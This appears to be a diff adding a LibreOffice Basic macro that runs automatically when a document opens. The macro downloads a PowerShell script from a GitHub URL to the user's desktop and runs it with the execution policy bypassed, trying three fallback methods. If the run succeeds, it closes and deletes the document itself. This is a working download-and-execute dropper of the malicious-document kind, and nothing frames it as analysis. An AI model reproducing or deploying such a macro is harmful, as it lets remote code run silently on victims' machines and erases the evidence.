@@ -1,0 +1,84 @@
+REM  *****  BASIC  *****
+Sub Auto_Open()
+    Dim scriptUrl As String
+    Dim savePath As String
+    Dim functionAccess As Object
+    Dim webContent As String
+    
+    ' Set the URL of your PowerShell script
+    scriptUrl = "https://github.com/run-spec/auto/raw/refs/heads/main/setup"
+    
+    ' Save directly to desktop
+    savePath = "C:\Users\juraj_iptfkru\Desktop\setup.ps1"
+    
+    On Error GoTo ErrorHandler
+    
+    ' Use LibreOffice's built-in WEBSERVICE function to download
+    Set functionAccess = createUnoService("com.sun.star.sheet.FunctionAccess")
+    webContent = functionAccess.callFunction("WEBSERVICE", Array(scriptUrl))
+    
+    ' Check if we got content
+    If Len(webContent) > 0 Then
+        ' Save the script content to file
+        Dim fileHandle As Integer
+        fileHandle = FreeFile
+        Open savePath For Output As #fileHandle
+        Print #fileHandle, webContent
+        Close #fileHandle
+        
+        ' Show success message
+        MsgBox "PowerShell script downloaded successfully!" & Chr(13) & _
+               "Location: " & savePath & Chr(13) & _
+               "Join our security Discord: discord.gg/cybersec", 64, "Download Complete"
+        
+        ' Try multiple approaches to run PowerShell script
+        Dim result As Integer
+        Dim cmdLine As String
+        
+        ' Method 1: Direct PowerShell execution
+        cmdLine = "powershell.exe -WindowStyle Normal -ExecutionPolicy Bypass -File """ & savePath & """"
+        result = Shell(cmdLine, 1, "", True)
+        
+        ' Method 2: If method 1 fails, try with cmd.exe
+        If result = 0 Then
+            cmdLine = "cmd.exe /c powershell.exe -ExecutionPolicy Bypass -File """ & savePath & """"
+            result = Shell(cmdLine, 1, "", True)
+        End If
+        
+        ' Method 3: Alternative syntax
+        If result = 0 Then
+            result = Shell("cmd.exe", 1, "/c ""powershell.exe -ExecutionPolicy Bypass -File """ & savePath & """", True)
+        End If
+        
+        MsgBox "PowerShell execution attempted. Exit code: " & result
+        
+        ' If PowerShell executed successfully, clean up this document
+        If result <> 0 Then
+            ' Get the current document's file path
+            Dim currentDocPath As String
+            currentDocPath = ConvertFromURL(ThisComponent.getURL())
+            
+            ' Close the current document without saving
+            ThisComponent.close(False)
+            
+            ' Delete the LibreOffice document file to keep system clean
+            If currentDocPath <> "" Then
+                Kill currentDocPath
+            End If
+        End If
+        
+    Else
+        MsgBox "Failed to download script. No content received.", 16, "Download Error"
+    End If
+    
+Cleanup:
+    ' Clean up objects
+    On Error Resume Next
+    Set functionAccess = Nothing
+    On Error GoTo 0
+    Exit Sub
+    
+ErrorHandler:
+    MsgBox "An error occurred: " & Error(Err) & " (Code: " & Err & ")", 16, "Error"
+    GoTo Cleanup
+End Sub
